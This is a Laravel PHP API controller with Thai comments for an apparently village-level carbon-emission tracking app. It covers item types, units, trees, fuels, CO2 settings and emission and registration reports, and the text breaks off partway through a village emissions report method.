<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\ItemType;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use App\Models\Unit;
use App\Models\Tree;
use App\Models\Fuel;
use Illuminate\Validation\Rule;
use Carbon\Carbon;

class BackendController extends Controller
{

    public function setupCoList()
    {
        $items = DB::table('setup_co2')
            ->select('setup_code', 'setup_name', 'value')
            ->orderBy('setup_code')
            ->get();

        return response()->json($items);
    }

    // POST /api/setupCoAdd
    public function setupCoAdd(Request $request)
    {
        $request->validate([
            'setup_name' => 'required|string',
            'value' => 'required|numeric',
        ]);

        $maxId = DB::table('setup_co2')->max('setup_code') ?? 0;
        $newCode = $maxId + 1;

        DB::table('setup_co2')->insert([
            'setup_code' => $newCode,
            'setup_name' => $request->setup_name,
            'value' => $request->value,
        ]);

        return response()->json(['status' => 200, 'message' => 'เพิ่มข้อมูลเรียบร้อยแล้ว']);
    }

    public function UserList(): JsonResponse
    {
        // 1) ดึงเฉพาะผู้นำ (User_Type = 2) พร้อมข้อมูลหมู่บ้าน
        $leaders = DB::table('user')
            ->join('village', 'user.Village_Code', '=', 'village.Village_Code')
            ->where('user.User_Type', 1)
            ->select(
                'user.User_Code',
                'user.User_Name',
                'user.email',
                'user.tel',
                'user.grov_code',
                'user.status',
                'user.img',                // เก็บชื่อไฟล์ไว้ก่อน
                'village.Village_Name',
                'village.Village_number'
            )
            ->get();

        // 2) map เติม URL รูปให้ field img (ถ้ามี)
        $leaders = $leaders->map(function ($u) {
            if (!empty($u->img)) {
                $u->img = url("storage/app/public/Users/{$u->img}");
            }
            return $u;
        });

        // 3) คืนค่า
        return response()->json($leaders, $leaders->isEmpty() ? 204 : 200);
    }

    // POST /api/setupCoEdit/{code}
    public function setupCoEdit(Request $request, $code)
    {
        $request->validate([
            'setup_name' => 'required|string',
            'value' => 'required|numeric',
        ]);

        $updated = DB::table('setup_co2')
            ->where('setup_code', $code)
            ->update([
                'setup_name' => $request->setup_name,
                'value' => $request->value,
            ]);

        if (!$updated) {
            return response()->json(['status' => 404, 'message' => 'ไม่พบข้อมูลที่จะอัปเดต'], 404);
        }

        return response()->json(['status' => 200, 'message' => 'อัปเดตข้อมูลเรียบร้อยแล้ว']);
    }

    // POST /api/setupCoDelete/{code}
    public function setupCoDelete($code)
    {
        $deleted = DB::table('setup_co2')
            ->where('setup_code', $code)
            ->delete();

        if (!$deleted) {
            return response()->json(['status' => 404, 'message' => 'ไม่พบข้อมูลที่จะลบ'], 404);
        }

        return response()->json(['status' => 200, 'message' => 'ลบข้อมูลเรียบร้อยแล้ว']);
    }
    public function ItemTypeList(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $item_type = ItemType::where('is_delete', 0)
            ->get()
            ->map(function ($item) {
                if (!empty($item->img)) {
                    // ปรับตามโครงสร้างไฟล์ของคุณ
                    $item->img = url("storage/app/public/itemTypes/{$item->img}");
                    // หรือใช้ Storage::url('itemTypes/'.$item->img);
                    // $item->img = Storage::url("itemTypes/{$item->img}");
                }
                return $item;
            });

        $statusCode = $item_type->isEmpty() ? 204 : 200;
        return response()->json($item_type, $statusCode);

    }
    public function ItemTypeInsert(Request $request): JsonResponse
    {
        // 1) Validate incoming payload
        $data = $request->validate([
            'Item_type_Name' => 'required|string|max:255',
            'Unit_Code' => 'nullable|integer|exists:unit,Unit_Code',
            'img' => 'nullable|file|image|max:5120',
        ]);

        // 2) คำนวณรหัสใหม่
        $newCode = (DB::table('item_type')->max('Item_type_Code') ?? 0) + 1;

        // 3) จับค่า type จาก unit
        $manyType = DB::table('unit')
            ->where('Unit_Code', $data['Unit_Code'])
            ->value(DB::raw("
           CASE
             WHEN type IN ('I','N') THEN 1
             WHEN type = 'B'        THEN 2
             ELSE NULL
           END
        "));

        // 4) เก็บไฟล์ (ถ้ามี) แล้วตั้งชื่อเป็น {Item_type_Code}.{ext}
        $fileName = null;
        if ($request->hasFile('img')) {
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();
            $fileName = "{$newCode}.{$ext}";

            // เก็บใน storage/app/public/itemTypes/
            $file->storeAs('itemTypes', $fileName, 'public');
        }


        // 5) Insert ข้อมูลลงตาราง
        try {
            DB::table('item_type')->insert([
                'Item_type_Code' => $newCode,
                'Item_type_Name' => $data['Item_type_Name'],
                'Unit_Code' => $data['Unit_Code'],
                'img' => $fileName,
                'Many_Type' => $manyType,
                'is_delete' => 0,
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
        ], 200);
    }



    /**
     * POST /api/itemTypeUpdate
     */
    public function ItemTypeUpdate(Request $request): JsonResponse
    {
        $data = $request->validate([
            'Item_type_Code' => 'required|integer|exists:item_type,Item_type_Code',
            'Item_type_Name' => 'required|string|max:255',
            'Unit_Code' => 'nullable|integer|exists:unit,Unit_Code',
            'img' => 'nullable|image|max:5120',
            'existing_img' => 'nullable|string',
        ]);

        $code = $data['Item_type_Code'];
        $manyType = DB::table('unit')
            ->where('Unit_Code', $data['Unit_Code'])
            ->select([
                'Unit_Code',
                'Unit_Name',
                // สร้าง field ชื่อ `type` เลยจาก CASE
                DB::raw("
            CASE
              WHEN type IN ('I','N') THEN 1
              WHEN type = 'B'        THEN 2
              ELSE NULL
            END AS type
        "),
            ])
            ->first();

        $typeValue = $manyType->type;

        // 1) อ่านชื่อไฟล์เก่าจาก DB (จะได้ '3.png')
        $oldFilename = DB::table('item_type')
            ->where('Item_type_Code', $code)
            ->value('img');

        // 2) ถ้ามีการอัปโหลดไฟล์ใหม่
        if ($request->hasFile('img')) {
            // ลบไฟล์เก่าออก
            if ($oldFilename) {
                Storage::disk('public')->delete("itemTypes/{$oldFilename}");
            }
            // เก็บไฟล์ใหม่ ใช้ชื่อ "<Item_type_Code>.<ext>"
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();
            $filename = "{$code}.{$ext}";
            $file->storeAs('itemTypes', $filename, 'public');

        } else {
            // 3) ถ้าไม่มีไฟล์ใหม่ ให้ใช้ค่า existing_img ที่ React ส่งมา (ซึ่งน่าจะเป็น URL)
            //    หรือ fallback ไปใช้ $oldFilename
            $existing = $data['existing_img'] ?? null;
            if ($existing) {
                // ดึงเฉพาะ basename ออกมา เช่น '3.png'
                $filename = pathinfo($existing, PATHINFO_BASENAME);
            } else {
                $filename = $oldFilename;
            }
        }

        // 4) อัปเดต DB: เก็บแค่ชื่อไฟล์
        try {
            DB::table('item_type')
                ->where('Item_type_Code', $code)
                ->update([
                    'Item_type_Name' => $data['Item_type_Name'],
                    'Unit_Code' => $data['Unit_Code'],
                    'img' => $filename,

                    'Many_Type' => $typeValue,
                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Update successful',
        ], 200);
    }


    /**
     * POST /api/itemTypeDelete
     */
    public function ItemTypeDelete(Request $request): JsonResponse
    {
        $data = $request->validate([
            'Item_type_Code' => 'required|integer|exists:item_type,Item_type_Code',
        ]);

        $itemTypeCode = $data['Item_type_Code'];

        // $filename = DB::table('item_type')->where('Item_type_Code', $itemTypeCode)->value('img');

        //     // 2) ลบไฟล์ภาพออกจาก storage
        //     if ($filename) {
        //         Storage::disk('public')->delete('itemTypes/' . $filename);
        //     }

        try {
            // ดึงสถานะปัจจุบัน (กันเผื่อเรียกซ้ำ)
            $row = DB::table('item_type')
                ->select('is_delete')
                ->where('Item_type_Code', $itemTypeCode)
                ->first();

            if (!$row) {
                return response()->json([
                    'status' => 404,
                    'message' => 'Item type not found',
                ], 404);
            }

            // ถ้าลบไปแล้ว (is_delete = 1) ก็ทำให้ idempotent
            if ((int) ($row->is_delete ?? 0) === 1) {
                return response()->json([
                    'status' => 200,
                    'message' => 'Already deleted',
                ], 200);
            }

            // Soft delete: เปลี่ยนสถานะ is_delete = 1 (และอัปเดตเวลา ถ้ามีคอลัมน์ updated_at)
            DB::table('item_type')
                ->where('Item_type_Code', $itemTypeCode)
                ->update([
                    'is_delete' => 1,// เอาออกได้ถ้าตารางไม่มีคอลัมน์นี้
                ]);

            return response()->json([
                'status' => 200,
                'message' => 'Delete successful (soft delete)',
            ], 200);

        } catch (\Throwable $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Delete failed: ' . $e->getMessage(),
            ], 500);
        }
    }
    public function UnitList(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $unit = Unit::all();
        $statusCode = $unit->isEmpty() ? 204 : 200;

        return response()->json($unit, $statusCode);
    }
    public function unitDetail(Request $request, $id): JsonResponse
    {
        $unit_detail = DB::table('emission_by_unit')->where('Unit_Code', $id)->get();
        $statusCode = $unit_detail->isEmpty() ? 204 : 200;

        return response()->json($unit_detail, $statusCode);
    }

    public function unitInsert(Request $request): JsonResponse
    {
        // 1) Validate
        $data = $request->validate([
            'Unit_Name' => 'required|string|max:255',
            'type' => 'required|string|max:255',
            'Ndivide' => 'nullable|numeric|min:0',
            'Idivide' => 'nullable|numeric|min:0',
        ]);
        $maxCode = DB::table('unit')->max('Unit_Code') ?? 0;
        $newCode = $maxCode + 1;

        // 2) Insert
        try {
            $id = DB::table('unit')->insertGetId([
                'Unit_code' => $newCode,
                'Unit_Name' => $data['Unit_Name'],
                'type' => $data['type'],
                'Ndivide' => $data['Ndivide'],
                'Idivide' => $data['Idivide'],
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
            'id' => $id,
        ], 200);
    }

    /**
     * POST /api/updateitemType/{id}
     */
    public function updateUnit(Request $request, $id): JsonResponse
    {
        // 1) Validate
        $data = $request->validate([
            'Unit_Name' => 'required|string|max:255',
            'type' => 'required|string|max:255',
            'Ndivide' => 'nullable|numeric|min:0',
            'Idivide' => 'nullable|numeric|min:0',
        ]);

        // 2) Ensure exists
        $exists = DB::table('unit')->where('Unit_code', $id)->exists();
        if (!$exists) {
            return response()->json([
                'status' => 404,
                'message' => 'Unit not found',
            ], 404);
        }

        // 3) Update
        try {
            DB::table('unit')
                ->where('Unit_code', $id)
                ->update([
                    'Unit_Name' => $data['Unit_Name'],
                    'type' => $data['type'],
                    'Ndivide' => $data['Ndivide'],
                    'Idivide' => $data['Idivide'],
                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Update successful',
        ], 200);
    }

    /**
     * POST /api/deleteUnit/{id}
     */
    public function deleteUnit($id): JsonResponse
    {
        // 1) Ensure exists
        $exists = DB::table('unit')->where('Unit_code', $id)->exists();
        if (!$exists) {
            return response()->json([
                'status' => 404,
                'message' => 'Unit not found',
            ], 404);
        }

        // 2) Delete
        try {
            DB::table('unit')->where('Unit_code', $id)->delete();
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Delete failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Delete successful',
        ], 200);
    }



    public function TreeList(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $tree = Tree::where('is_delete', 0)->get();
        return response()->json($tree, $tree->isEmpty() ? 204 : 200);
    }
    public function treeInsert(Request $request): JsonResponse
    {
        // 1) Validate
        $data = $request->validate([
            'tree_Name' => 'required|string|max:255',
            'Co2_apsorb' => 'required|numeric|min:0',
        ]);
        $maxCode = DB::table('tree')->max('tree_Code') ?? 0;
        $newCode = $maxCode + 1;

        // 2) Insert
        try {
            $id = DB::table('tree')->insertGetId([
                'tree_Code' => $newCode,
                'tree_Name' => $data['tree_Name'],
                'Co2_apsorb' => $data['Co2_apsorb'],
                'is_delete' => 0,
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
            'id' => $id,
        ], 200);
    }
    public function treeUpdate(Request $request, $id): JsonResponse
    {
        // 1) Validate
        $data = $request->validate([
            'tree_Name' => 'required|string|max:255',
            'Co2_apsorb' => 'required|numeric|min:0',
        ]);

        // 2) Ensure exists
        $exists = DB::table(table: 'tree')->where('tree_code', $id)->exists();
        if (!$exists) {
            return response()->json([
                'status' => 404,
                'message' => 'Tree not found',
            ], 404);
        }

        // 3) Update
        try {
            DB::table('tree')
                ->where('tree_code', $id)
                ->update([
                    'tree_Name' => $data['tree_Name'],
                    'Co2_apsorb' => $data['Co2_apsorb'],
                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Update successful',
        ], 200);
    }
    public function deleteTree($id): JsonResponse
    {

        // 1) Ensure exists
        $exists = DB::table('tree')->where('tree_code', $id)->exists();
        if (!$exists) {
            return response()->json([
                'status' => 404,
                'message' => 'Tree not found',
            ], 404);
        }

        // 2) Delete
        try {
            DB::table('tree')
                ->where('tree_code', $id)
                ->update([
                    'is_delete' => 1,// เอาออกได้ถ้าตารางไม่มีคอลัมน์นี้
                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Delete failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Delete successful',
        ], 200);
    }

    public function FuelList(): JsonResponse
    {
        // ดึงข้อมูลทั้งหมด
        $fuel = Fuel::where('is_delete', 0)
            ->get()->map(function ($item) {
                // ถ้ามีชื่อไฟล์ img
                if ($item->img) {
                    // สร้าง URL เต็ม เช่น http://localhost/storage/item_type/5.png
                    $item->img = url("storage/app/public/Fuels/{$item->img}");
                }
                return $item;
            });

        $statusCode = $fuel->isEmpty() ? 204 : 200;
        return response()->json($fuel, $statusCode);
    }

    public function fuelInsert(Request $request): JsonResponse
    {
        // 1) Validate เข้า
        $data = $request->validate([
            'fuel_Name' => 'required|string|max:255',
            'Distance_time' => 'required|numeric|min:0',
            'Co2_emission' => 'required|numeric|min:0',
            'N2o_emission' => 'required|numeric|min:0',
            'Ch4_emission' => 'required|numeric|min:0',
            'usageType' => 'required|string|max:2',
            'img' => 'nullable|image|max:5120',
        ]);

        // 2) คำนวณรหัสใหม่
        $maxCode = DB::table('fuel')->max('fuel_Code') ?? 0;
        $newCode = $maxCode + 1;

        // 3) เก็บไฟล์เฉพาะชื่อ
        if ($request->hasFile('img')) {
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();          // นามสกุล
            $fileName = $newCode . '.' . $ext;                       // e.g. "5.png"
            $file->storeAs('Fuels', $fileName, 'public');           // เก็บจริงใน storage/app/public/itemTypes
            $data['img'] = $fileName;                                 // เก็บแค่ชื่อไฟล์ลง DB
        } else {
            $data['img'] = null;
        }

        // 4) Insert พร้อม Item_type_Code และชื่อไฟล์
        try {
            DB::table('fuel')->insert([
                'fuel_Code' => $newCode,
                'fuel_Name' => $data['fuel_Name'],
                'Distance_time' => $data['Distance_time'],
                'Co2_emission' => $data['Co2_emission'],
                'N2o_emission' => $data['N2o_emission'],
                'Ch4_emission' => $data['Ch4_emission'],
                'type' => $data['usageType'],
                'img' => $data['img'],
                'is_delete' => 0,
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Insert failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Insert successful',
        ], 200);
    }
    public function fuelUpdate(Request $request): JsonResponse
    {
        $data = $request->validate([
            'fuel_Code' => 'required|integer|exists:fuel,fuel_Code',
            'fuel_Name' => 'required|string|max:255',
            'Distance_time' => 'required|numeric|min:0',
            'Co2_emission' => 'required|numeric|min:0',
            'N2o_emission' => 'required|numeric|min:0',
            'Ch4_emission' => 'required|numeric|min:0',
            'usageType' => 'required|string|max:2',
            'img' => 'nullable|image|max:5120',

        ]);

        $code = $data['fuel_Code'];

        // 1) อ่านชื่อไฟล์เก่าจาก DB (จะได้ '3.png')
        $oldFilename = DB::table('fuel')
            ->where('fuel_Code', $code)
            ->value('img');

        // 2) ถ้ามีการอัปโหลดไฟล์ใหม่
        if ($request->hasFile('img')) {
            // ลบไฟล์เก่าออก
            if ($oldFilename) {
                Storage::disk('public')->delete("Fuels/{$oldFilename}");
            }
            // เก็บไฟล์ใหม่ ใช้ชื่อ "<Item_type_Code>.<ext>"
            $file = $request->file('img');
            $ext = $file->getClientOriginalExtension();
            $filename = "{$code}.{$ext}";
            $file->storeAs('Fuels', $filename, 'public');

        } else {
            // 3) ถ้าไม่มีไฟล์ใหม่ ให้ใช้ค่า existing_img ที่ React ส่งมา (ซึ่งน่าจะเป็น URL)
            //    หรือ fallback ไปใช้ $oldFilename
            $existing = $data['existing_img'] ?? null;
            if ($existing) {
                // ดึงเฉพาะ basename ออกมา เช่น '3.png'
                $filename = pathinfo($existing, PATHINFO_BASENAME);
            } else {
                $filename = $oldFilename;
            }
        }

        // 4) อัปเดต DB: เก็บแค่ชื่อไฟล์
        try {
            DB::table('fuel')
                ->where('fuel_Code', $code)
                ->update([
                    'fuel_Name' => $data['fuel_Name'],
                    'Distance_time' => $data['Distance_time'],
                    'Co2_emission' => $data['Co2_emission'],
                    'N2o_emission' => $data['N2o_emission'],
                    'Ch4_emission' => $data['Ch4_emission'],
                    'type' => $data['usageType'],
                    'img' => $filename,

                ]);
        } catch (\Exception $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Update failed: ' . $e->getMessage(),
            ], 500);
        }

        return response()->json([
            'status' => 200,
            'message' => 'Update successful',
        ], 200);
    }

    public function fuelDelete(Request $request): JsonResponse
    {
        $data = $request->validate([
            'fuel_Code' => 'required|integer|exists:fuel,fuel_Code',
        ]);

        $fuelCode = $data['fuel_Code'];

        $filename = DB::table('fuel')->where('fuel_Code', $fuelCode)->value('img');

        // 2) ลบไฟล์ภาพออกจาก storage
        if ($filename) {
            Storage::disk('public')->delete('Fuels/' . $filename);
        }

        try {
            // ดึงสถานะปัจจุบัน (กันเผื่อเรียกซ้ำ)
            $row = DB::table('fuel')
                ->select('is_delete')
                ->where('fuel_Code', $fuelCode)
                ->first();

            if (!$row) {
                return response()->json([
                    'status' => 404,
                    'message' => 'Item type not found',
                ], 404);
            }

            // ถ้าลบไปแล้ว (is_delete = 1) ก็ทำให้ idempotent
            if ((int) ($row->is_delete ?? 0) === 1) {
                return response()->json([
                    'status' => 200,
                    'message' => 'Already deleted',
                ], 200);
            }

            // Soft delete: เปลี่ยนสถานะ is_delete = 1 (และอัปเดตเวลา ถ้ามีคอลัมน์ updated_at)
            DB::table('fuel')
                ->where('fuel_Code', $fuelCode)
                ->update([
                    'is_delete' => 1,
                    'updated_at' => now(), // เอาออกได้ถ้าตารางไม่มีคอลัมน์นี้
                ]);

            return response()->json([
                'status' => 200,
                'message' => 'Delete successful (soft delete)',
            ], 200);

        } catch (\Throwable $e) {
            return response()->json([
                'status' => 500,
                'message' => 'Delete failed: ' . $e->getMessage(),
            ], 500);
        }

    }

    public function getRegisterReport(Request $request)
    {
        // 1. Validate input
        $request->validate([
            'type' => ['required', Rule::in(['วัน', 'ช่วงวัน', 'สัปดาห์', 'เดือน', 'ปี'])],
            'value' => ['nullable'], // อาจเป็น string/number หรือ array/object (สำหรับ month => {month, year})
            'villages' => ['array'],
            'villages.*' => ['integer', 'exists:village,Village_Code'],
            'start' => ['nullable', 'date'],
            'end' => ['nullable', 'date', 'after_or_equal:start'],
            'year' => ['nullable', 'integer'],
        ]);

        $type = $request->input('type', 'วัน');
        $value = $request->input('value');      // อาจเป็น '8' หรือ ['month' => 8, 'year' => 2025]
        $yearParam = $request->input('year');  // ถ้าส่งแยกมา
        $villages = $request->input('villages', []);

        // ถ้าไม่มีหมู่บ้านที่เลือก ให้คืนว่าง (frontend ของคุณต้องการแบบนี้)
        if (count($villages) === 0) {
            return response()->json(['success' => true, 'data' => []]);
        }

        // 2. Mapping expressions สำหรับ label ที่ frontend คาดหวัง
        $exprMap = [
            'วัน' => "HOUR(created_at)",                 // 0..23
            'ช่วงวัน' => "DATE(created_at)",                 // 'YYYY-MM-DD'
            'สัปดาห์' => "DATE_FORMAT(created_at, '%a')",    // Mon, Tue, ...
            'เดือน' => "DATE_FORMAT(created_at, '%d')",    // '01','02',...
            'ปี' => "MONTH(created_at)",                // 1..12
        ];
        $expr = $exprMap[$type] ?? $exprMap['วัน'];

        // 3. Build base query: นับจำนวนผู้ลงทะเบียน
        $q = DB::table('user')
            ->selectRaw("$expr AS label, COUNT(*) AS count")
            ->when(count($villages), fn($q) => $q->whereIn('Village_Code', $villages));

        // 4. Filter by date depending on type
        if (($type === 'ช่วงวัน' || $type === 'สัปดาห์') && $request->filled('start') && $request->filled('end')) {
            $start = Carbon::parse($request->start)->startOfDay();
            $end = Carbon::parse($request->end)->endOfDay();
            $q->whereBetween('created_at', [$start, $end]);
        } elseif ($type === 'วัน' && $value) {
            // value คาดว่าจะเป็น YYYY-MM-DD
            $q->whereDate('created_at', $value);
        } elseif ($type === 'เดือน') {
            // รองรับ value เป็น simple month หรือ object/array {month, year}
            $month = null;
            $year = null;

            if (is_array($value) || is_object($value)) {
                // ใช้ data_get เพื่อความยืดหยุ่น
                $month = data_get($value, 'month', null);
                $year = data_get($value, 'year', null);
            } else {
                $month = $value;
            }

            // ให้ priority กับ param 'year' แยกถ้ามี
            if ($yearParam) {
                $year = $yearParam;
            }

            // ถ้าไม่มีปี ให้ใช้ปีปัจจุบัน
            $year = $year ?? date('Y');

            if ($month) {
                $q->whereMonth('created_at', intval($month))
                    ->whereYear('created_at', intval($year));
            } else {
                // ถ้ามีแต่ปี
                if ($year) {
                    $q->whereYear('created_at', intval($year));
                }
            }
        } elseif ($type === 'ปี') {
            // value คาดว่าจะเป็นปี (หรือสามารถส่งด้วย param year)
            $yr = $value ?? $yearParam;
            if ($yr) {
                $q->whereYear('created_at', intval($yr));
            }
        }

        // 5. Group & order
        $q->groupByRaw($expr);

        if ($type === 'เดือน') {
            $q->orderByRaw("DAY(created_at)");
        } elseif ($type === 'ปี') {
            $q->orderByRaw("MONTH(created_at)");
        } elseif ($type === 'สัปดาห์') {
            // เรียง Mon..Sun ให้แน่นอน
            $q->orderByRaw("FIELD($expr,'Mon','Tue','Wed','Thu','Fri','Sat','Sun')");
        } else {
            $q->orderByRaw($expr);
        }

        $data = $q->get();

        return response()->json([
            'success' => true,
            'data' => $data,
        ]);
    }


    public function emissionReport(Request $request)
    {
        // 1. Validate input
        $request->validate([
            'type' => ['required', Rule::in(['วัน', 'ช่วงวัน', 'สัปดาห์', 'เดือน', 'ปี'])],
            'value' => ['nullable'], // อาจเป็น string|number|array|object (frontend อาจส่ง json)
            'start' => ['nullable', 'date'],
            'end' => ['nullable', 'date', 'after_or_equal:start'],
            'gases' => ['array'],
            'gases.*' => ['nullable'], // จะ sanitize ต่อไปในโค้ด
            'year' => ['nullable', 'integer'],
        ]);

        $type = $request->input('type');
        $rawValue = $request->input('value');
        $yearParam = $request->input('year');
        $gases = $request->input('gases', []);

        // ถ้า frontend ส่ง JSON string ใน value ให้ decode
        if (is_string($rawValue)) {
            $decoded = json_decode($rawValue, true);
            if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
                $value = $decoded;
            } else {
                $value = $rawValue;
            }
        } else {
            $value = $rawValue;
        }

        // normalize gases (รองรับ 'all' หรือ case-insensitive)
        $gasesNormalized = array_map(function ($g) {
            return strtoupper((string) $g);
        }, $gases);

        $keys = [];
        if (in_array('ALL', $gasesNormalized, true) || empty($gasesNormalized)) {
            // ถ้าไม่มีส่งค่าหรือส่ง all ให้เอาทุกก๊าซหลัก
            $keys = ['CO2', 'CH4', 'N2O'];
        } else {
            // filter ให้เหลือเฉพาะ CO2/CH4/N2O (ป้องกันค่าส่งมาแปลก ๆ)
            $allowed = ['CO2', 'CH4', 'N2O'];
            foreach ($gasesNormalized as $g) {
                if (in_array($g, $allowed, true))
                    $keys[] = $g;
            }
            if (empty($keys)) {
                // fallback
                $keys = ['CO2', 'CH4', 'N2O'];
            }
        }

        // mapping expression
        $exprMap = [
            'วัน' => "HOUR(`Date_time`)",
            'ช่วงวัน' => "DATE(`Date_time`)",
            'สัปดาห์' => "DATE_FORMAT(`Date_time`,'%a')", // Mon,Tue,...
            'เดือน' => "DATE_FORMAT(`Date_time`,'%d')",    // '01','02',...
            'ปี' => "MONTH(`Date_time`)",
        ];
        $expr = $exprMap[$type] ?? $exprMap['วัน'];

        // build selects
        $selects = ["$expr AS label"];
        foreach ($keys as $key) {
            $col = strtoupper($key) . '_emission';
            $selects[] = "SUM(`$col`) AS `$key`";
        }
        $selectRaw = implode(', ', $selects);

        $q = DB::table('usings')
            ->where('input_type', 'd')
            ->selectRaw($selectRaw);

        // filter by date / range
        if (in_array($type, ['ช่วงวัน', 'สัปดาห์']) && $request->filled('start') && $request->filled('end')) {
            $start = Carbon::parse($request->start)->startOfDay();
            $end = Carbon::parse($request->end)->endOfDay();
            $q->whereBetween('Date_time', [$start, $end]);
        } elseif ($type === 'วัน' && $value) {
            $q->whereDate('Date_time', $value);
        } elseif ($type === 'เดือน') {
            // value อาจเป็น simple month หรือ array/object ['month'=>x,'year'=>y]
            $month = null;
            $year = null;

            if (is_array($value) || is_object($value)) {
                $month = $value['month'] ?? ($value->month ?? null);
                $year = $value['year'] ?? ($value->year ?? null);
            } else {
                $month = $value;
            }

            if ($yearParam)
                $year = $yearParam;
            $year = $year ?? date('Y');

            if ($month) {
                $q->whereMonth('Date_time', intval($month))
                    ->whereYear('Date_time', intval($year));
            } else {
                // ถ้ามีแต่ปี
                if ($year) {
                    $q->whereYear('Date_time', intval($year));
                }
            }
        } elseif ($type === 'ปี' && $value) {
            $q->whereYear('Date_time', intval($value));
        }

        // group & order
        $q->groupByRaw($expr);

        if ($type === 'เดือน') {
            $q->orderByRaw("DAY(Date_time)");
        } elseif ($type === 'ปี') {
            $q->orderByRaw("MONTH(`Date_time`)");
        } elseif ($type === 'สัปดาห์') {
            // ถ้าต้องการเรียง Mon..Sun (DB คืน 'Mon','Tue'...) ให้ใช้ FIELD
            $q->orderByRaw("FIELD(DATE_FORMAT(`Date_time`,'%a'),'Mon','Tue','Wed','Thu','Fri','Sat','Sun')");
        } else {
            $q->orderByRaw($expr);
        }

        $data = $q->get();

        return response()->json([
            'success' => true,
            'data' => $data,
        ]);
    }


    public function emissionVillage(Request $request)
    {
        // 1. Validate input
        $request->validate([
            'type' => ['required', Rule::in(['วัน', 'ช่วงวัน', 'สัปดาห์', 'เดือน', 'ปี'])],
            'value' => ['nullable'], // อาจเป็น string/number หรือ array/object {month,year}
            'villages' => ['array'],
            'villages.*' => ['integer', 'exists:village,Village_Code'],
            'start' => ['nullable', 'date'],
            'end' => ['nullable', 'date', 'after_or_equal:start'],
            'year' => ['nullable', 'integer'],
        ]);

        $type = $request->input('type', 'วัน');
        $value = $request->input('value');
        $yearParam = $request->input('year');
        $villages = $request->input('villages', []);

        // ถ้าไม่มีหมู่บ้านที่เลือก ให้คืนว่าง (frontend ของคุณตั้งแบบนี้)
        if (count($villages) === 0) {
            return response()->json(['success' => true, 'data' => []]);
        }

        // helper: สร้าง expression โดยรับชื่อคอลัมน์วันที่เป็น parameter
        $exprFor = function (string $type, string $dateCol) {
            return match ($type) {
                'วัน' => "HOUR($dateCol)",
                'ช่วงวัน' => "DATE($dateCol)",
                'สัปดาห์' => "DATE_FORMAT($dateCol, '%a')",
                'เดือน' => "DATE_FORMAT($dateCol, '%d')",
                'ปี' => "MONTH($dateCol)",
                default => "DATE($dateCol)",
            };
        };

        // expressions
        $exprUsing = $exprFor($type, 'Date_time');    // ใช้กับ usings.Date_time
        $exprReducing = $exprFor($type, 'reducing.date'); // ใช้กับ reducing.date

        // 3. Query สำหรับ usings (รวม emission)
        $qUsing = DB::table('usings')
            ->join('user', 'usings.User_Code', '=', 'user.User_Code')
            ->where('usings.input_type', 'd')
            ->selectRaw("
            $exprUsing AS label,
            SUM(CO2_emission) AS total_CO2,
            SUM(CH4_emission) AS total_CH4,
            SUM(N2O_emission) AS total_N2O,
            SUM(CO2_emission + CH4_emission + N2O_emission) AS total_gas
        ")
            ->when(count($villages), fn($q) => $q->whereIn('user.Village_Code', $villages));

        // 3b. Query สำหรับ reducing (รวมค่าการลด)
        $qReducing = DB::table('reducing')
            ->join('user', 'reducing.User_Code', '=', 'user.User_Code')
            ->selectRaw("
            $exprReducing AS label,
            SUM(reducing) AS total_reduced
        ")
            ->when(count($villages), fn($q) => $q->whereIn('user.Village_Code', $villages));

        // 4. Apply same date filters to both queries (Date_time vs reducing.date)
        if (($type === 'ช่วงวัน' || $type === 'สัปดาห์') && $request->filled('start') && $request->filled('end')) {
            $start = Carbon::parse($request->start)->startOfDay();
            $end = Carbon::parse($request->end)->endOfDay();
            $qUsing->whereBetween('Date_time', [$start, $end]);
            $qReducing->whereBetween('reducing.date', [$start, $end]);
        } elseif ($type === 'วัน' && $value) {
            // value คาดเป็น YYYY-MM-DD
            $qUsing->whereDate('Date_time', $value);
            $qReducing->whereDate('reducing.date', $value);
        } elseif ($type === 'เดือน') {
            // รองรับ value เป็น simple month หรือ object {month,year}
            $month = null;
            $year = null;

            if (is_array($value) || is_object($value)) {
                $month = $value['month'] ?? $value->month ?? null;
                $year = $value['year'] ?? $value->year ?? null;
            } else {
                $month = $value;
            }

